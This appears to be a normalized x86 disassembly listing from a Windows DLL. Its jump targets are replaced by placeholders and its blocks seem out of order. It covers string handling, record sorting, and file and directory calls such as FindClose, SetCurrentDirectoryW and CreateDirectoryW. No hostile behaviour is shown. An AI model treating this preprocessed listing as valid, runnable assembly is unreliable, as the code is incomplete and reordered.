setne al
or eax 0xffffffff
jmp r-xdata
test eax eax
jne r-xdata
mov ax [ ecx ]
cmp ax [ edx ]
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0x328 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_10005dc0
push 0x1
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10005dc0
mov edi [ ebp - 0x33c ]
lea eax [ ebp - 0x100 ]
push eax
mov ecx edi
call sub_1000fd60
mov [ ebp - 0x4 ] 0x5
lea ecx [ ebp - 0x28 ]
push 0xffffffff
push 0x0
push eax
call sub_10005cf0
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0xec ] 0x8
jb r-xdata
lea ecx [ ebp - 0x328 ]
lea edx [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
test eax eax
xor eax eax
mov [ ebp - 0xec ] 0x7
push 0xffffffff
mov [ ebp - 0x90 ] eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x8c ] eax
push eax
mov [ ebp - 0x100 ] ax
mov [ ebp - 0x90 ] eax
mov [ ebp - 0xa0 ] ax
lea eax [ ebp + 0x28 ]
push eax
mov [ ebp - 0xf0 ] 0x0
mov [ ebp - 0x8c ] 0x7
call sub_10003a20
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x90 ] 0x0
jbe r-xdata
push [ ebp - 0x100 ]
call j_sub_1003f3e3#2
add esp 0x4
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0x328 ]
push eax
lea ecx [ ebp - 0x40 ]
call sub_10009730
mov [ ebp - 0x4 ] 0x3
or ebx 0x2
mov [ ebp - 0x32c ] ebx
lea ecx [ ebp - 0x40 ]
cmp [ ebp - 0x2c ] 0x8
mov esi 0x2
mov edi [ ebp - 0x30 ]
cmovae ecx [ ebp - 0x40 ]
cmp edi esi
cmovb esi edi
test esi esi
je r-xdata
cmp [ ebp - 0x328 ] 0x0
jne r-xdata
push 0x1
push r--data
lea ecx [ ebp - 0xa0 ]
call sub_10005dc0
xor eax eax
mov edx r--data
lea ecx [ ebp - 0x328 ]
lea edx [ ecx + 0x2 ]
jmp r-xdata
xor ecx ecx
jmp r-xdata
sete al
test al al
sete al
test al al
je r-xdata
cmp edi 0x2
jae r-xdata
movzx eax [ ecx ]
cmp ax [ edx ]
sbb eax eax
and eax 0xfffffffe
inc eax
jmp r-xdata
add ecx 0x2
add edx 0x2
dec esi
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
push ecx
lea eax [ ebp - 0x328 ]
push eax
lea ecx [ ebp - 0xa0 ]
call sub_10005dc0
sub esp 0x18
xor eax eax
mov ecx esp
mov [ ebp - 0x330 ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ ebp - 0x28 ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x4 ] 0x6
lea ecx [ ebp - 0xc4 ]
call sub_1000dc20
mov [ ebp - 0x4 ] 0x8
sub esp 0x18
mov ecx esp
mov [ ebp - 0x330 ] esp
xor eax eax
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ ebp - 0xa0 ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x9
lea eax [ ebp - 0xc4 ]
mov ebx [ ebp - 0x338 ]
push ebx
push eax
mov [ ebp - 0x4 ] 0x8
mov ecx edi
call sub_1000f230
push 0xffffffff
push 0x0
lea eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_10003a20
cmp [ ebp - 0x18 ] 0x0
jbe r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
cmp edi 0x2
setne al
or eax 0xffffffff
jmp r-xdata
test eax eax
jne r-xdata
mov ax [ ecx ]
cmp ax [ edx ]
jne r-xdata
sub ecx edx
sar ecx 0x1
cmp [ ebp - 0x328 ] 0x0
jne r-xdata
push 0x1
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10005dc0
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x32c ]
test al 0x2
je r-xdata
test eax eax
lea ecx [ ebp - 0x328 ]
lea edx [ ecx + 0x2 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0x328 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_10005dc0
push 0x2
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10005dc0
sub esp 0x18
xor eax eax
mov ecx esp
mov [ ebp - 0x330 ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ ebp - 0x28 ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0xa
mov [ ebp - 0x4 ] 0x8
lea ecx [ ebp - 0xe8 ]
call sub_1000dc20
mov [ ebp - 0x4 ] 0xb
xor eax eax
push 0xffffffff
push eax
mov [ ebp - 0x88 ] ax
lea ecx [ ebp - 0x88 ]
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x78 ] 0x0
mov [ ebp - 0x74 ] 0x0
push eax
mov [ ebp - 0x74 ] 0x7
mov [ ebp - 0x78 ] 0x0
call sub_10003a20
mov [ ebp - 0x4 ] 0xc
cmp [ ebp - 0x78 ] 0x0
jbe r-xdata
cmp [ ebp - 0x328 ] 0x0
jne r-xdata
push 0x1
push r--data
lea ecx [ ebp - 0x88 ]
call sub_10005dc0
lea ecx [ ebp - 0x328 ]
lea edx [ ecx + 0x2 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0x328 ]
push eax
lea ecx [ ebp - 0x88 ]
call sub_10005dc0
xor eax eax
mov [ ebp - 0x60 ] 0x0
push 0xffffffff
push eax
mov [ ebp - 0x70 ] ax
lea ecx [ ebp - 0x70 ]
lea eax [ ebp + 0x28 ]
mov [ ebp - 0x5c ] 0x0
push eax
mov [ ebp - 0x5c ] 0x7
mov [ ebp - 0x60 ] 0x0
call sub_10003a20
mov [ ebp - 0x4 ] 0xd
cmp [ ebp - 0x60 ] 0x0
jbe r-xdata
cmp [ ebp - 0x328 ] 0x0
jne r-xdata
push 0x1
push r--data
lea ecx [ ebp - 0x70 ]
call sub_10005dc0
lea ecx [ ebp - 0x328 ]
lea edx [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0x328 ]
push eax
lea ecx [ ebp - 0x70 ]
call sub_10005dc0
sub esp 0x18
xor eax eax
mov ecx esp
mov [ ebp - 0x330 ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ ebp - 0x70 ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0xe
sub esp 0x18
mov ecx esp
mov [ ebp - 0x340 ] esp
xor eax eax
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ ebp - 0x88 ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0xf
lea eax [ ebp - 0xe8 ]
push eax
push ebx
mov [ ebp - 0x4 ] 0xd
mov ecx edi
call sub_1000f440
mov [ ebp - 0x4 ] 0xc
cmp [ ebp - 0x5c ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x5c ] 0x7
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x70 ] ax
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x74 ] 0x8
jb r-xdata
push [ ebp - 0x70 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp - 0x74 ] 0x7
mov [ ebp - 0x78 ] 0x0
mov [ ebp - 0x88 ] ax
mov [ ebp - 0x4 ] 0x8
mov [ ebp - 0xe8 ] r--data
mov [ ebp - 0x4 ] 0x11
mov eax [ ebp - 0xcc ]
mov ebx [ FindClose@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x88 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0x10
cmp [ ebp - 0xd0 ] 0x8
jb r-xdata
push eax
call ebx
mov [ ebp - 0xcc ] 0x0
xor eax eax
mov [ ebp - 0xd0 ] 0x7
mov [ ebp - 0xd4 ] 0x0
mov [ ebp - 0xe4 ] ax
mov [ ebp - 0x4 ] 0x8
mov [ ebp - 0xe8 ] r--data
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0xc4 ] r--data
mov [ ebp - 0x4 ] 0x13
mov eax [ ebp - 0xa8 ]
test eax eax
je r-xdata
push [ ebp - 0xe4 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0x12
cmp [ ebp - 0xac ] 0x8
jb r-xdata
push eax
call ebx
mov [ ebp - 0xa8 ] 0x0
xor eax eax
mov [ ebp - 0xac ] 0x7
mov [ ebp - 0xb0 ] 0x0
mov [ ebp - 0xc0 ] ax
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0xc4 ] r--data
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x8c ] 0x8
jb r-xdata
push [ ebp - 0xc0 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp - 0x8c ] 0x7
mov [ ebp - 0x90 ] 0x0
mov [ ebp - 0xa0 ] ax
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x14 ] 0x8
jb r-xdata
push [ ebp - 0xa0 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] ax
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1000fd60
push ebp
mov ebp esp
push 0xffffffff
push sub_1004d5b1
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
sub esp 0x18
mov [ ebp - 0x10 ] 0x0
mov eax esp
mov [ ebp - 0x14 ] esp
push eax
call sub_10009aa0
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
call sub_10007be0
add esp 0x18
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_1000fde0
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] ecx
mov ecx ebx
push edi
mov eax [ ebx ]
call [ eax + 0xc ]
mov edx eax
mov eax 0x76b981db
mul edx
mov eax edx
shr eax 0x8
mov [ ebp - 0xc ] eax
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor ecx ecx
mov [ ebp + 0x8 ] ecx
test eax eax
je r-xdata
sub eax ecx
xor esi esi
dec eax
mov [ ebp - 0x8 ] eax
je r-xdata
mov eax [ ebp - 0xc ]
inc ecx
mov [ ebp + 0x8 ] ecx
cmp ecx eax
jb r-xdata
mov edi edi
mov esi edi
cmp esi [ ebp - 0x8 ]
jb r-xdata
push edi
push esi
push ebx
call sub_100101d0
mov ecx [ ebp - 0x4 ]
lea edi [ esi + 0x1 ]
push esi
push edi
push ebx
call sub_1000fe60
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
sub_1000fe60
push ebp
mov ebp esp
sub esp 0x45c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x45c ]
push edi
push 0x228
push 0x0
push eax
mov edi ecx
call sub_10045ec0
add esp 0xc
lea eax [ ebp - 0x234 ]
push 0x228
push 0x0
push eax
call sub_10045ec0
mov edx [ esi ]
lea eax [ ebp - 0x45c ]
add esp 0xc
mov ecx esi
push 0x228
push eax
imul eax [ ebp + 0xc ] 0x228
push eax
call [ edx + 0x14 ]
mov edx [ esi ]
lea eax [ ebp - 0x234 ]
push 0x228
push eax
imul eax [ ebp + 0x10 ] 0x228
mov ecx esi
push eax
call [ edx + 0x14 ]
mov ecx [ ebp - 0x254 ]
mov eax [ ebp - 0x2c ]
and ecx 0x10
je r-xdata
test ecx ecx
jne r-xdata
test al 0x10
jne r-xdata
lea eax [ ebp - 0x234 ]
mov ecx edi
push eax
lea eax [ ebp - 0x45c ]
push eax
call sub_1000ff50
mov ecx [ ebp - 0x8 ]
pop edi
xor ecx ebp
pop esi
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
test al 0x10
je r-xdata
mov eax 0x1
pop edi
pop esi
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
xor eax eax
pop edi
pop esi
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
sub_1000ff50
push ebp
mov ebp esp
push 0xffffffff
push sub_1004d5e0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov eax [ ebx + 0x20 ]
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
test eax eax
je r-xdata
xor eax eax
cmp eax 0x1
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
cmp eax 0x3
jne r-xdata
mov ecx [ ebx + 0x24 ]
test ecx ecx
jne r-xdata
cmp [ ebx + 0x24 ] 0x1
jne r-xdata
push edi
push esi
call sub_1003d023
add esp 0x8
test eax eax
js r-xdata
cmp eax 0x4
jne r-xdata
mov ecx [ ebx + 0x24 ]
test ecx ecx
jne r-xdata
cmp ecx 0x1
jne r-xdata
mov eax [ esi + 0x214 ]
cmp eax [ edi + 0x214 ]
ja r-xdata
push edi
push esi
call sub_1003d023
add esp 0x8
test eax eax
jle r-xdata
mov eax 0x1
jmp r-xdata
cmp eax 0x5
jne r-xdata
mov ecx [ ebx + 0x24 ]
test ecx ecx
jne r-xdata
cmp ecx 0x1
jne r-xdata
mov eax [ esi + 0x21c ]
cmp eax [ edi + 0x21c ]
ja r-xdata
mov eax [ esi + 0x214 ]
cmp eax [ edi + 0x214 ]
jb r-xdata
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x40 ]
push eax
call sub_10010290
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push edi
push eax
call sub_10010290
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x28 ]
cmp [ ebp - 0x14 ] 0x8
lea eax [ ebp - 0x40 ]
cmovae ecx [ ebp - 0x28 ]
cmp [ ebp - 0x2c ] 0x8
push ecx
cmovae eax [ ebp - 0x40 ]
push eax
call sub_1003d023
add esp 0x8
mov [ ebp - 0x44 ] eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
cmp ecx 0x1
jne r-xdata
mov eax [ esi + 0x224 ]
cmp eax [ edi + 0x224 ]
ja r-xdata
mov eax [ esi + 0x21c ]
cmp eax [ edi + 0x21c ]
jb r-xdata
jb r-xdata
ja r-xdata
mov eax [ esi + 0x210 ]
cmp eax [ edi + 0x210 ]
jb r-xdata
cmp [ ebx + 0x24 ] 0x1
jne r-xdata
test eax eax
js r-xdata
mov eax [ esi + 0x224 ]
cmp eax [ edi + 0x224 ]
jb r-xdata
jb r-xdata
ja r-xdata
mov eax [ esi + 0x218 ]
cmp eax [ edi + 0x218 ]
jb r-xdata
mov eax [ esi + 0x210 ]
cmp eax [ edi + 0x210 ]
jbe r-xdata
xor esi esi
test eax eax
jg r-xdata
mov esi 0x1
jmp r-xdata
jne r-xdata
ja r-xdata
mov eax [ esi + 0x220 ]
cmp eax [ edi + 0x220 ]
jb r-xdata
mov eax [ esi + 0x218 ]
cmp eax [ edi + 0x218 ]
jbe r-xdata
mov eax ecx
jmp r-xdata
jne r-xdata
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x28 ]
call sub_100036b0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x40 ]
call sub_100036b0
mov eax esi
jmp r-xdata
push edi
push esi
call sub_1003d023
add esp 0x8
test eax eax
js r-xdata
mov eax [ esi + 0x220 ]
cmp eax [ edi + 0x220 ]
jbe r-xdata
mov eax ecx
jmp r-xdata
push edi
push esi
call sub_1003d023
add esp 0x8
test eax eax
jle r-xdata
mov eax [ ebp - 0x44 ]
mov eax ecx
jmp r-xdata
sub_100101d0
push ebp
mov ebp esp
sub esp 0x460
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x45c ]
push esi
push edi
push 0x228
push 0x0
push eax
call sub_10045ec0
push 0x228
lea eax [ ebp - 0x234 ]
push 0x0
push eax
call sub_10045ec0
imul edi [ ebp + 0xc ] 0x228
lea ecx [ ebp - 0x45c ]
mov eax [ ebx ]
add esp 0x18
push 0x228
push ecx
push edi
mov ecx ebx
call [ eax + 0x14 ]
imul esi [ ebp + 0x10 ] 0x228
lea ecx [ ebp - 0x234 ]
mov eax [ ebx ]
push 0x228
push ecx
mov ecx ebx
push esi
call [ eax + 0x14 ]
mov eax [ ebx ]
lea ecx [ ebp - 0x234 ]
push 0x228
push ecx
push edi
mov ecx ebx
call [ eax + 0x10 ]
mov eax [ ebx ]
lea ecx [ ebp - 0x45c ]
push 0x228
push ecx
push esi
mov ecx ebx
call [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
sub_10010290
push ebp
mov ebp esp
push 0xffffffff
push sub_1004d631
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx [ ebp + 0xc ]
xor eax eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] ax
cmp [ edx ] ax
jne r-xdata
mov ecx edx
lea edi [ ecx + 0x2 ]
lea ebx [ ebx ]
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edi
sar ecx 0x1
push ecx
push edx
lea ecx [ ebp - 0x28 ]
call sub_10009730
mov [ ebp - 0x4 ] 0x1
sub esp 0x8
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x30 ] 0x2e
lea ecx [ ebp - 0x28 ]
push eax
call sub_100103f0
cmp eax 0xffffffff
je r-xdata
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x4 ] al
push 0xffffffff
inc eax
lea ecx [ ebp - 0x28 ]
push eax
push esi
call sub_10009440
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x28 ] ax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x8
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
cmp [ ebp - 0x14 ] 0x8
jb r-xdata
sub_100103c0
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
mov esi ecx
xor eax eax
push [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
call sub_10009730
mov eax esi
pop esi
pop ebp
retn 0x8
sub_100103f0
push ebp
mov ebp esp
sub esp 0x8
push ebx
mov ebx ecx
or ecx 0xffffffff
push esi
push edi
mov eax [ ebx + 0x10 ]
cmp eax 0x1
jb r-xdata
pop edi
pop esi
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
dec eax
cmp eax ecx
cmova eax ecx
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov ecx ebx
call sub_10003b00
cmp edi eax
je r-xdata
mov esi 0x1
mov edx ecx
mov eax edi
lea edi [ ecx + eax * 2 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ ecx ]
mov [ ebp - 0x4 ] eax
or ecx 0xffffffff
mov eax [ ebp - 0x4 ]
sub edi 0x2
mov ecx [ ebp + 0x8 ]
jmp r-xdata
movzx eax [ eax ]
cmp ax [ edx ]
sbb eax eax
and eax 0xfffffffe
inc eax
je r-xdata
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
cmp [ edi ] ax
jne r-xdata
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
mov cx [ eax ]
cmp cx [ edx ]
jne r-xdata
sub edi ebx
sar edi 0x1
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ebx [ ebx ]
sub_10010490
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004d6bb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x290
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x288 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2a0 ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov eax [ ebp + 0x8 ]
lea ecx [ esp + 0x60 ]
push 0x1
push eax
call sub_100080c0
mov [ esp + 0x2a8 ] 0x0
cmp [ esp + 0x68 ] 0x0
je r-xdata
sub esp 0x18
lea ebx [ edi - 0x2c ]
mov eax esp
mov [ esp + 0x28 ] esp
mov ecx ebx
push eax
call sub_10009aa0
mov [ esp + 0x2c0 ] 0x2
mov [ esp + 0x2c0 ] 0x0
lea ecx [ esp + 0x60 ]
call sub_10007be0
add esp 0x18
mov [ esp + 0x2a8 ] 0x3
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x44 ] 0x0
mov [ esp + 0x44 ] 0xf
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x2a8 ] 0x4
test [ edi - 0x10 ] 0x1
je r-xdata
mov eax [ edi - 0x2c ]
lea ecx [ edi - 0x2c ]
mov eax [ eax + 0x8 ]
add ecx eax
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
mov ecx [ esp + 0x64 ]
sub esp 0x18
mov esi esp
mov [ esp + 0x28 ] esp
mov [ esp + 0x44 ] eax
mov ebx edx
mov edi [ ecx ]
push esi
call [ edi + 0x14 ]
mov [ esp + 0x2c0 ] 0x1
push ebx
push [ esp + 0x48 ]
mov [ esp + 0x2c8 ] 0x0
call sub_10008410
add esp 0x20
mov edi eax
jmp r-xdata
cmp [ esp + 0x5c ] 0x8
lea ecx [ esp + 0x30 ]
lea eax [ esp + 0x48 ]
cmovae eax [ esp + 0x48 ]
push ecx
push eax
call sub_10010820
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x10 ] esi
mov [ esp + 0x2a8 ] 0x5
test esi esi
je r-xdata
cmp [ esp + 0x5c ] 0x8
lea eax [ esp + 0x48 ]
cmovae eax [ esp + 0x48 ]
push eax
lea eax [ esp + 0x88 ]
push 0x105
push eax
call sub_1003d249
add esp 0xc
lea eax [ esp + 0x84 ]
push r--data
push eax
call sub_1003d2a5
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov [ esp + 0x2a8 ] 0xffffffff
mov [ esp + 0x60 ] r--data
mov [ esp + 0x2a8 ] 0x7
cmp [ esp + 0x7c ] 0x0
jbe r-xdata
xor esi esi
mov ecx [ ebx ]
mov ecx [ ecx + 0x8 ]
add ecx 0xffffffd4
add ecx edi
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov esi eax
jmp r-xdata
mov ebx 0x5c
mov [ esp + 0x2a8 ] 0xffffffff
cmp [ esp + 0x80 ] 0x8
jb r-xdata
cmp [ esp + 0x80 ] 0x8
lea eax [ esp + 0x6c ]
cmovae eax [ esp + 0x6c ]
push eax
call [ SetCurrentDirectoryW@IAT ]
mov [ esp + 0x2a8 ] 0x4
cmp [ esp + 0x28 ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov [ esp + 0x2a8 ] 0x4
lea eax [ esp + 0x30 ]
push 0xffffffff
push 0x0
mov [ esp + 0x2c ] 0x0
lea ecx [ esp + 0x1c ]
mov [ esp + 0x30 ] 0x0
push eax
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
call sub_100018b0
mov [ esp + 0x2a8 ] 0x6
lea ecx [ esi + 0x34 ]
lea eax [ esp + 0x14 ]
cmp ecx eax
je r-xdata
xor eax eax
mov [ esi ] ax
lea eax [ esp + 0x30 ]
push eax
lea eax [ esp + 0x88 ]
push eax
call sub_10010820
lea eax [ esi + 0x2 ]
mov [ esi ] bx
push r--data
push eax
call sub_1003d2a5
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
lea ebx [ edi - 0x2c ]
xor eax eax
mov [ esp + 0x80 ] 0x7
mov [ esp + 0x6c ] ax
mov eax edi
mov [ esp + 0x7c ] 0x0
mov ecx [ esp + 0x2a0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x288 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ esp + 0x6c ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x14 ] 0x0
test esi esi
jne r-xdata
push [ esp + 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ esi ]
mov edi [ eax + 0x8 ]
add edi esi
xor edi edi
jmp r-xdata
mov [ esp + 0x44 ] 0xf
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x2a8 ] 0x0
cmp [ esp + 0x5c ] 0x8
jb r-xdata
push [ esp + 0x30 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x2a8 ] 0x3
cmp [ esp + 0x44 ] 0x10
jb r-xdata
xor eax eax
mov [ esp + 0x5c ] 0x7
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x48 ] ax
push [ esp + 0x48 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10010820
push ebp
mov ebp esp
push 0xffffffff
push sub_1004d71c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
cmp [ rw-data ] 0x0
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov esi [ InterlockedExchange@IAT ]
mov [ ebp - 0x4bc ] eax
jne r-xdata
mov ebx [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx 0x2e
call sub_100382c0
push eax
push rw-data
call esi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ ebp - 0x4c0 ] eax
jne r-xdata
mov ecx 0x2f
call sub_100382c0
push eax
push rw-data
call esi
mov edx [ rw-data ]
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov ecx 0x14
call sub_100382c0
push eax
push rw-data
call esi
mov esi [ ebp - 0x4bc ]
push 0x0
push esi
call [ CreateDirectoryW@IAT ]
mov [ ebp - 0x4c4 ] eax
call [ GetLastError@IAT ]
sub esp 0x18
mov [ ebp - 0x4c8 ] eax
mov edx esp
mov [ ebp - 0x4cc ] esp
xor eax eax
mov [ edx + 0x14 ] 0x7
mov [ edx + 0x10 ] 0x0
mov [ edx ] ax
cmp [ esi ] ax
jne r-xdata
cmp [ edx ] 0x0
jne r-xdata
mov ecx esi
lea eax [ ecx + 0x2 ]
mov [ ebp - 0x4bc ] eax
xor ecx ecx
jmp r-xdata
mov ecx edx
lea esi [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
